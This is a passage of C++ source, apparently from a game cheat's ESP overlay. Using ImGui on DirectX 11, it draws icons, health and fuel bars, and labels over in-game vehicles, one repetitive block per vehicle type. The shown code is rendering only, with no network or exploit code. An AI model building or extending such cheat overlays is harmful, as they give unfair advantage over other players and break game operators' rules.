													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 74, 5.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{


													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 78.00f, 5.0, Vehicle.oil);

												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_BRDM_Color[0], Setting::vahicle_Text_item_BRDM_Color[1], Setting::vahicle_Text_item_BRDM_Color[2], Setting::vahicle_Text_item_BRDM_Color[3]);
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_BRDM_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Scooter && Vehicle.Name == u8"Scooter")
											{
												if (Setting::vahicle_Text_item_Scooter_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Scooter, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Scooter, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;


													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 75, 5.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{


													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 75.00f, 5.0, Vehicle.oil);

												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_Scooter_Color[0], Setting::vahicle_Text_item_Scooter_Color[1], Setting::vahicle_Text_item_Scooter_Color[2], Setting::vahicle_Text_item_Scooter_Color[3]);
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_Scooter_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Motorcycle && Vehicle.Name == u8"Motorcycle")
											{
												if (Setting::vahicle_Text_item_Motorcycle_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Motorcycle, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Motorcycle, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;


													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 80, 5.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{


													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 80.00f, 5.0, Vehicle.oil);

												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_Motorcycle_Color[0], Setting::vahicle_Text_item_Motorcycle_Color[1], Setting::vahicle_Text_item_Motorcycle_Color[2], Setting::vahicle_Text_item_Motorcycle_Color[3]);
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_Motorcycle_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Motorcycle3 && Vehicle.Name == u8"Motorcycle 3")
											{
												if (Setting::vahicle_Text_item_Motorcycle_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Motorcycle3, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Motorcycle3, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;


													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 80, 5.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{


													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 80.00f, 5.0, Vehicle.oil);

												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_Motorcycle3_Color[0], Setting::vahicle_Text_item_Motorcycle3_Color[1], Setting::vahicle_Text_item_Motorcycle3_Color[2], Setting::vahicle_Text_item_Motorcycle3_Color[3]);
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_Motorcycle3_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Snowmobile && Vehicle.Name == u8"Snowmobile")
											{
												if (Setting::vahicle_Text_item_Snowmobile_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Snowmobile, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Snowmobile, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;


													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 100, 5.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{


													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 100.00f, 5.0, Vehicle.oil);

												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_Snowmobile_Color[0], Setting::vahicle_Text_item_Snowmobile_Color[1], Setting::vahicle_Text_item_Snowmobile_Color[2], Setting::vahicle_Text_item_Snowmobile_Color[3]);
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_Snowmobile_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Tuk && Vehicle.Name == u8"Tuk Tuk")
											{
												if (Setting::vahicle_Text_item_Tuk_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Tuk, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Tuk, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;


													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 77, 5.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{


													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 77.00f, 5.0, Vehicle.oil);

												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_Tuk_Color[0], Setting::vahicle_Text_item_Tuk_Color[1], Setting::vahicle_Text_item_Tuk_Color[2], Setting::vahicle_Text_item_Tuk_Color[3]);
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_Tuk_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Buggy && Vehicle.Name == u8"Buggy")
											{
												if (Setting::vahicle_Text_item_Buggy_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Buggy, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Buggy, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;


													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 80, 5.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{


													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 80.00f, 5.0, Vehicle.oil);

												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_Buggy_Color[0], Setting::vahicle_Text_item_Buggy_Color[1], Setting::vahicle_Text_item_Buggy_Color[2], Setting::vahicle_Text_item_Buggy_Color[3]);
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_Buggy_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Sports && Vehicle.Name == u8"Sports")
											{
												if (Setting::vahicle_Text_item_Sports_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Sports, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Sports, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;


													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 73, 5.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{


													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 73.00f, 5.0, Vehicle.oil);

												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_Sports_Color[0], Setting::vahicle_Text_item_Sports_Color[1], Setting::vahicle_Text_item_Sports_Color[2], Setting::vahicle_Text_item_Sports_Color[3]);
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_Sports_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Dacia && Vehicle.Name == u8"Dacia")
											{
												if (Setting::vahicle_Text_item_Dacia_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Dacia, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Dacia, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}

												if (Setting::hp)
												{

													std::string hpveh;


													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 63, 5.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{


													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 63.00f, 5.0, Vehicle.oil);

												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_Dacia_Color[0], Setting::vahicle_Text_item_Dacia_Color[1], Setting::vahicle_Text_item_Dacia_Color[2], Setting::vahicle_Text_item_Dacia_Color[3]);
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_Dacia_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Rony && Vehicle.Name == u8"Rony")
											{
												if (Setting::vahicle_Text_item_Rony_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Rony, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Rony, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;


													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 67, 5.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{


													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 67.00f, 5.0, Vehicle.oil);

												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_Rony_Color[0], Setting::vahicle_Text_item_Rony_Color[1], Setting::vahicle_Text_item_Rony_Color[2], Setting::vahicle_Text_item_Rony_Color[3]);
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_Rony_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_UAZ && Vehicle.Name == u8"UAZ")
											{
												if (Setting::vahicle_Text_item_UAZ_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::UAZ, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::UAZ, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;


													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 61, 5.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{


													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 61.00f, 5.0, Vehicle.oil);

												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_UAZ_Color[0], Setting::vahicle_Text_item_UAZ_Color[1], Setting::vahicle_Text_item_UAZ_Color[2], Setting::vahicle_Text_item_UAZ_Color[3]);
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_UAZ_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Minibus && Vehicle.Name == u8"Minibus")
											{
												if (Setting::vahicle_Text_item_Minibus_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Minibus, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Minibus, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;


													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 82, 5.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{


													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 86.00f, 5.0, Vehicle.oil);

												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_Minibus_Color[0], Setting::vahicle_Text_item_Minibus_Color[1], Setting::vahicle_Text_item_Minibus_Color[2], Setting::vahicle_Text_item_Minibus_Color[3]);
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_Minibus_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_PG117 && Vehicle.Name == u8"Ship")
											{
												if (Setting::vahicle_Text_item_PG117_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::PG117, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::PG117, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;


													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 56, 5.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{


													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 56.00f, 5.0, Vehicle.oil);

												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_PG117_Color[0], Setting::vahicle_Text_item_PG117_Color[1], Setting::vahicle_Text_item_PG117_Color[2], Setting::vahicle_Text_item_PG117_Color[3]);
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_PG117_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Aquarail && Vehicle.Name == u8"Boat")
											{
												if (Setting::vahicle_Text_item_Aquarail_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Aquarail, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Aquarail, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;


													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 64, 5.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{


													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 64.00f, 5.0, Vehicle.oil);

												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_Aquarail_Color[0], Setting::vahicle_Text_item_Aquarail_Color[1], Setting::vahicle_Text_item_Aquarail_Color[2], Setting::vahicle_Text_item_Aquarail_Color[3]);
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_Aquarail_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_BigFoot && Vehicle.Name == u8"Monster Truck")
											{
												if (Setting::vahicle_Text_item_BigFoot_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::BigFoot, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::BigFoot, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;


													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 114, 5.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{


													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 114.00f, 5.0, Vehicle.oil);

												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_BigFoot_Color[0], Setting::vahicle_Text_item_BigFoot_Color[1], Setting::vahicle_Text_item_BigFoot_Color[2], Setting::vahicle_Text_item_BigFoot_Color[3]);
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_BigFoot_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_UTV && Vehicle.Name == u8"UTV")
											{
												if (Setting::vahicle_Text_item_UTV_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::UTV, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::UTV, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;


													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 80, 5.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{


													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 80.00f, 5.0, Vehicle.oil);

												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_UTV_Color[0], Setting::vahicle_Text_item_UTV_Color[1], Setting::vahicle_Text_item_UTV_Color[2], Setting::vahicle_Text_item_UTV_Color[3]);
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_UTV_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Capsule && Vehicle.Name == u8"Capsule")
											{
												if (Setting::vahicle_Text_item_Capsule_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Capsule, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Capsule, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;


													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 80, 5.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{


													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 80.00f, 5.0, Vehicle.oil);

												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_Capsule_Color[0], Setting::vahicle_Text_item_Capsule_Color[1], Setting::vahicle_Text_item_Capsule_Color[2], Setting::vahicle_Text_item_Capsule_Color[3]);
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_Capsule_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Coupe && Vehicle.Name == u8"Coupe")
											{
												if (Setting::vahicle_Text_item_Coupe_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Coupe, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Coupe, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;


													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 79, 5.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{


													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 79.00f, 5.0, Vehicle.oil);

												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_Coupe_Color[0], Setting::vahicle_Text_item_Coupe_Color[1], Setting::vahicle_Text_item_Coupe_Color[2], Setting::vahicle_Text_item_Coupe_Color[3]);
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_Coupe_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_PickUpTruck && Vehicle.Name == u8"PickUp Truck")
											{
												if (Setting::vahicle_Text_item_PickUpTruck_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::PickUpTruck, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::PickUpTruck, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;


													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 80, 5.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{


													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 80.00f, 5.0, Vehicle.oil);

												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_PickUpTruck_Color[0], Setting::vahicle_Text_item_PickUpTruck_Color[1], Setting::vahicle_Text_item_PickUpTruck_Color[2], Setting::vahicle_Text_item_PickUpTruck_Color[3]);
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_PickUpTruck_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_SnowBike && Vehicle.Name == u8"SnowBike")
											{
												if (Setting::vahicle_Text_item_SnowBike_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::SnowBike, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::SnowBike, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;


													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 87, 5.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{


													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 87.00f, 5.0, Vehicle.oil);

												}
												if (Vehicle.driving)
												{
													color = DX11::ImGui_DX11::Color::Red;
												}
												else {
													color = ImColor(Setting::vahicle_Text_item_SnowBike_Color[0], Setting::vahicle_Text_item_SnowBike_Color[1], Setting::vahicle_Text_item_SnowBike_Color[2], Setting::vahicle_Text_item_SnowBike_Color[3]);
												}

												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::vahicle_Text_item_SnowBike_TextSize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Bike && Vehicle.Name == u8"Bike")
											{
												if (Setting::vahicle_Text_item_Bike_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Bike, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Bike, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;


